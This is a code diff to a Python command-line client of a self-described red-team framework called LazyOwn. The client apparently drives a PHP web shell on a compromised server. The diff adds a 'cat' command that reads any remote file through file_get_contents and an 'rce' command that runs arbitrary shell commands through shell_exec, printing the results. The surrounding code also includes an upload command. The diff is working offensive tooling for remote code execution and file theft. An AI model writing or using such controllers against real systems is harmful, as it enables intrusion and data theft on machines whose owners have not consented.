@@ -55,6 +55,7 @@ def fixPath(path):
     if "\\" in path:
         path = path.replace("\\", "/")
     return path
+
 class Terminal(Cmd):
     intro = "\n\nMini LazyOwn RedTeam Framework \n\nUse help or ? for commands\n\nBig Brother Github: https://github.com/grisuno/LazyOwn"
 
@@ -80,6 +81,24 @@ class Terminal(Cmd):
                 print(" "+i.split("=>")[1])
             except:
                 print(" ")
+
+    def do_cat(self, args):
+        'Displays the contents of a specified file'
+        args = fixPath(args)
+        cmd = "echo file_get_contents(\"{}\");".format(args)
+        doReset()
+        sendCmd(cmd)
+        content = getOutput()
+        print(content)
+
+    def do_rce(self, args):
+        'rce whoami'
+        args = fixPath(args)
+        cmd = "echo shell_exec(\"{}\");".format(args)
+        doReset()
+        sendCmd(cmd)
+        content = getOutput()
+        print(content)
 
     def do_upload(self,args):
         'Upload file to remote. Usage: upload local path,remote path'
